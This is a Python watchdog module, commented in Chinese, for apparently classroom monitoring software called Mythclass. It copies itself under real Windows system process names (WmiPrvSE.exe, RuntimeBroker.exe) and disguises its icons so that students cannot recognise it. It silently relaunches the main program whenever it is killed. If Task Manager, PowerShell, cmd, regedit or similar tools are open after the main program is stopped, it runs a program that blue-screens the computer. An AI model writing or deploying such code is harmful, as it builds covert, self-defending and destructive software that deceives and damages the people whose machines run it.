"""看门狗（两个副本，名字学系统进程）

主人要的：
  进程1  看着主进程在不在 —— 不在（更新 / 主动退出除外）就把它拉起来
  进程2  看着 PowerShell / 任务管理器 / 资源监视器 / cmd ——
         这些开着 **而且** 主进程没了（同样是更新/主动退出除外）→ 让电脑蓝屏

为什么用副本：进程名得像个系统进程，不能让学生一眼看出是 Mythclass。
所以把主程序复制成两个名字（WmiPrvSE.exe / RuntimeBroker.exe）放在同一个
目录里，用 --watch 参数跑。而主进程启动时会检查这两个在不在，缺了就拉起来。

⚠️ 安全阀：环境变量 MYTHCLASS_SAFE=1 时**绝不**执行蓝屏程序，只在日志里写
   "本该蓝屏"。所有测试都带这个变量，免得把测试机搞蓝屏。
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path

# 进程名：都是 Windows 上真实存在的系统进程名（混在里面看不出来）
NAMES = {
    "main": "WmiPrvSE.exe",  # 看着主进程的那个
    "tools": "RuntimeBroker.exe",  # 看着 PowerShell/任务管理器 的那个
}

# 主人指定的蓝屏程序
BSOD_EXE = r"W:\Files\D\Files\Temps_临时\蓝屏\wbrn.exe"

# 学生可能拿来"关掉它"的东西
WATCH_TOOLS = (
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "taskmgr.exe",
    "perfmon.exe",
    "resmon.exe",
    "procexp.exe",
    "procexp64.exe",
    "taskkill.exe",
    "regedit.exe",
    "mmc.exe",
)

POLL_SECONDS = 3.0
GRACE_SECONDS = 25.0  # 主进程没了多久才动手（留出更新、主动退出的时间）


def safe_mode() -> bool:
    return bool(os.environ.get("MYTHCLASS_SAFE"))


def _log(text: str) -> None:
    """看门狗自己写日志（不能依赖主进程那套 logging）"""
    try:
        base = Path(os.environ.get("APPDATA") or Path.home()) / "Mythclass"
        base.mkdir(parents=True, exist_ok=True)
        stamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(base / "watchdog.log", "a", encoding="utf-8") as fh:
            fh.write(f"{stamp} {text}\n")
    except Exception:
        pass


# ------------------------------ 进程副本 ------------------------------


def _install_dir() -> Path:
    return Path(sys.executable).parent


def _frozen() -> bool:
    return bool(getattr(sys, "frozen", False))


def copies() -> dict[str, Path]:
    """两个副本该在哪"""
    d = _install_dir()
    return {role: d / name for role, name in NAMES.items()}


def ensure_copies() -> dict[str, Path]:
    """把主程序复制成那两个名字（只有一个 exe 的打包版才做）"""
    made = copies()
    if not _frozen():
        return made  # 源码跑的时候没有 exe 可复制，直接在原进程上跑守护逻辑
    src = Path(sys.executable)
    for role, dst in made.items():
        try:
            if not dst.exists() or dst.stat().st_size != src.stat().st_size:
                import shutil

                shutil.copy2(src, dst)
                _log(f"放好了看门狗副本：{dst.name}")
                # 换皮：图标和版本信息都学系统进程，不然任务管理器一眼认出来
                try:
                    from . import camouflage

                    good, why = camouflage.dress_up(dst, role)
                    _log(("换皮成功：" if good else "换皮失败：") + why)
                except Exception as err:
                    _log(f"换皮出错：{type(err).__name__}: {err}")
        except Exception as err:
            _log(f"复制 {dst.name} 失败：{type(err).__name__}: {err}")
    return made


def _launch(role: str) -> bool:
    """拉起一个看门狗"""
    flags = 0
    for name in ("CREATE_NO_WINDOW", "DETACHED_PROCESS"):
        flags |= getattr(subprocess, name, 0)
    try:
        if _frozen():
            exe = copies()[role]
            if not exe.exists():
                return False
            subprocess.Popen([str(exe), "--watch", role], creationflags=flags, close_fds=True)
        else:
            # 源码模式：用 pythonw 跑同一个模块（进程名不好看，但只在开发时这样）
            exe = sys.executable.replace("python.exe", "pythonw.exe")
            if not Path(exe).exists():
                exe = sys.executable
            subprocess.Popen([exe, "-m", "mythclass", "--watch", role], creationflags=flags, close_fds=True)
        return True
    except Exception as err:
        _log(f"拉起 {role} 失败：{type(err).__name__}: {err}")
        return False


def _running(role: str) -> bool:
    """那个看门狗在不在跑（按命令行里的 --watch 角色认）"""
    try:
        import psutil

        for proc in psutil.process_iter(["name", "cmdline"]):
            try:
                cmd = " ".join(proc.info.get("cmdline") or [])
            except Exception:
                continue
            if "--watch" in cmd and role in cmd:
                return True
    except Exception:
        pass
    return False


def ensure() -> None:
    """主进程启动时叫一次：两个看门狗都得在"""
    if safe_mode():
        _log("安全模式：不拉起看门狗")
        return
    ensure_copies()
    for role in NAMES:
        if not _running(role):
            if _launch(role):
                _log(f"拉起了看门狗 {role}（{NAMES[role]}）")


# ------------------------------ 主进程在不在 ------------------------------


def _pid_file() -> Path:
    base = Path(os.environ.get("APPDATA") or Path.home()) / "Mythclass"
    return base / "main.pid"


def write_pid() -> None:
    try:
        target = _pid_file()
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(str(os.getpid()), encoding="utf-8")
    except Exception:
        pass


def main_alive() -> bool:
    """主进程还活着吗（先看 pid 文件，再用 psutil 核对一次）"""
    try:
        pid = int(_pid_file().read_text(encoding="utf-8").strip() or 0)
    except Exception:
        return False
    if pid <= 0:
        return False
    try:
        import psutil

        proc = psutil.Process(pid)
        name = (proc.name() or "").lower()
        # 打包版叫 MythclassClient.exe；源码版是 python/pythonw
        return "mythclass" in name or "python" in name
    except Exception:
        return False


def intentional_exit() -> tuple[bool, str]:
    """这一次退出是不是"说好了的"（更新 / 主动退出）"""
    from . import guard as guard_mod
    from . import updater as updater_mod

    try:
        marker = updater_mod.pending_path()
        if marker.exists():
            # 超过 30 分钟的更新标记算过期 —— 不然一次没清干净的标记
            # 会让看门狗永远以为"正在更新"，既不拉人也不蓝屏。
            age = time.time() - marker.stat().st_mtime
            if age < 1800:
                return True, "正在更新"
            _log(f"更新标记已经 {int(age / 60)} 分钟没动静了，当过期处理")
    except Exception:
        pass
    try:
        if guard_mod.stop_requested():
            return True, "主动退出"
    except Exception:
        pass
    return False, ""


# ------------------------------ 蓝屏 ------------------------------


def tools_running() -> list[str]:
    hits: list[str] = []
    try:
        import psutil

        for proc in psutil.process_iter(["name"]):
            try:
                name = (proc.info.get("name") or "").lower()
            except Exception:
                continue
            if name in WATCH_TOOLS:
                hits.append(name)
    except Exception:
        pass
    return sorted(set(hits))


def bsod_path() -> Path:
    """蓝屏程序在哪。

    优先用**安装包里带的**那份 —— 不然教室那台没有 W: 盘就永远不触发。
    找不到才退回主人给的绝对路径。
    """
    cands = []
    meipass = getattr(sys, "_MEIPASS", "")
    if meipass:
        cands.append(Path(meipass) / "mythclass" / "assets" / "wbrn.exe")
    cands.append(_install_dir() / "mythclass" / "assets" / "wbrn.exe")
    cands.append(_install_dir() / "_internal" / "mythclass" / "assets" / "wbrn.exe")
    cands.append(Path(BSOD_EXE))
    for c in cands:
        try:
            if c.exists():
                return c
        except Exception:
            continue
    return Path(BSOD_EXE)


def trigger_bsod(why: str) -> bool:
    """让电脑蓝屏。安全模式下只记日志。"""
    exe = bsod_path()
    if safe_mode():
        _log(f"【安全模式】本该蓝屏（{why}），没执行 {exe}")
        return False
    if not exe.exists():
        _log(f"蓝屏程序不在（安装包里没有、{BSOD_EXE} 也没有）")
        return False
    try:
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        subprocess.Popen([str(exe)], creationflags=flags, close_fds=True)
        _log(f"已执行蓝屏程序（{why}）")
        return True
    except Exception as err:
        _log(f"执行蓝屏程序失败：{type(err).__name__}: {err}")
        return False


# ------------------------------ 守护循环 ------------------------------


def run(role: str) -> int:
    """看门狗本体。role = main | tools"""
    _log(f"看门狗启动：{role}（{NAMES.get(role, '?')}），安全模式={safe_mode()}")
    gone_since = 0.0
    while True:
        time.sleep(POLL_SECONDS)
        alive = main_alive()
        if alive:
            gone_since = 0.0
            continue

        planned, why = intentional_exit()
        if planned:
            _log("主进程不在了，但这次是说好的（" + why + "）—— 看门狗退出")
            return 0

        if not gone_since:
            gone_since = time.time()
        waited = time.time() - gone_since
        if waited < GRACE_SECONDS:
            continue

        if role == "main":
            _log("主进程不在了，拉起来")
            if _relaunch_main():
                gone_since = 0.0
                time.sleep(8)
            else:
                time.sleep(5)
        else:
            hits = tools_running()
            if hits:
                trigger_bsod("主进程没了，而且这些还开着：" + "、".join(hits))
                time.sleep(30)
            else:
                gone_since = 0.0


def _relaunch_main() -> bool:
    from . import guard as guard_mod

    try:
        if _frozen():
            cmd = [sys.executable]
        else:
            exe = sys.executable.replace("python.exe", "pythonw.exe")
            cmd = [exe if Path(exe).exists() else sys.executable, "-m", "mythclass"]
        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        guard_mod.clear_stop()
        subprocess.Popen(cmd, creationflags=flags, close_fds=True)
        return True
    except Exception as err:
        _log(f"拉起主进程失败：{type(err).__name__}: {err}")
        return False


def stop_all() -> int:
    """主动退出时：把两个看门狗一起请走（它们看到 stop 标记会自己退）"""
    from . import guard as guard_mod

    guard_mod.request_stop()
    killed = 0
    try:
        import psutil

        for proc in psutil.process_iter(["cmdline"]):
            try:
                cmd = " ".join(proc.info.get("cmdline") or [])
            except Exception:
                continue
            if "--watch" in cmd and "mythclass" in cmd.lower():
                proc.kill()
                killed += 1
    except Exception:
        pass
    return killed
